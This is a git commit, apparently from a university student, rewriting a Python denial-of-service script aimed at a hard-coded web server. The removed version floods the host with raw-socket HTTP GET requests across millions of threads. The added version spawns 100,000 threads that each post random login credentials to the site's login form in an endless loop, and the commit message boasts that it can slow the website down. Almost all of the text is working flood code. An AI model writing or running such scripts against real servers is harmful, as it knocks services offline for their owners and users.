a6cc69e0bb32817a0f990aea2bf0fb539f6fb717
xsucho08 <xsucho08@vutbr.cz>
2020-11-17 18:24:04 +0100

    can slowdown a website on a good day with a good wifi login with requests

--- dos/dos.py
+++ dos/dos.py
@@ -1,68 +1,46 @@
-import socket
-import string
-import sys
 import threading
 import time
+import requests
+import string
+import random
 
 
-# Print thread status
-def print_status():
-    global thread_num
-    thread_num += 1
-    if thread_num % 100 == 0:
-        print("cont: " + str(thread_num))
+def login():
+    msg = str(string.ascii_letters)
+    random_username = "".join(random.sample(msg, 3))
+    payload = {'username': random_username,
+               'password': random_username,
+               'login': 'login'
+               }
+    # infinite loop
+    while 2 > 1:
+        try:
+            # instance to make a post request to the login url with  login details as a payload
+            r = requests.Session()
+            r.post(url, data=payload)
+            r.close()
+            print("=")
+        except requests.exceptions.HTTPError as errh:
+            print("Http Error:")
+        except requests.exceptions.ConnectionError as errc:
+            print("Error Connecting:")
+        except requests.exceptions.Timeout as errt:
+            print("Timeout Error:")
+        except requests.exceptions.RequestException as err:
+            print("OOps: Something Else")
 
-# Perform the request
-def dos_attack():
-    print_status()
-    url_path = str(string.ascii_letters + string.digits + string.punctuation)
-    # Create a raw socket
-    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    try:
-        # Open the connection on that raw socket
-        dos.connect((ip, port))
-        # Send the request according to HTTP spec
-        msg = "GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host)
-        byt = msg.encode()
-        dos.send(byt)
-    except socket.error:
-        dos.close()
-    finally:
-        # Close our socket gracefully
-        dos.shutdown(socket.SHUT_RDWR)
-        dos.close()
 
 if __name__ == '__main__':
-    host = "http://apache1.willilazarov.cz/"
-    ip = "109.238.43.202"
-    port = 80
-    num_requests = 100000000
-    sys.argv = [host, ip, port, num_requests]
-
-    # Convert FQDN to IP
-    try:
-        host = str(sys.argv[1]).replace("https://", "").replace("http://", "")
-        print(host)
-        ip = socket.gethostbyname(host)
-        print(ip)
-    except socket.gaierror:
-        print("Wrong website")
-        sys.exit(2)
-
-    # Create a shared variable for thread counts
-    thread_num = 0
-    thread_num_mutex = threading.Lock()
-
+    #ip = '109.238.43.202'
+    url = 'http://apache1.willilazarov.cz/'
+    num_requests = 100000
     print("Attack started")
-
     # Spawn a thread per request
-    thread_list = []
+    all_threads = []
     for i in range(num_requests):
-        new_thread = threading.Thread(target=dos_attack)
+        new_thread = threading.Thread(target=login)
         new_thread.start()
-        thread_list.append(new_thread)
-        # Adjusting this sleep time will affect requests per second
-        time.sleep(0.00001)
-
+        all_threads.append(new_thread)
+    # Make the main thread wait for the other threads
     for current_thread in all_threads:
-        current_thread.join()  # Make the main thread wait for the children threads
+        current_thread.join()
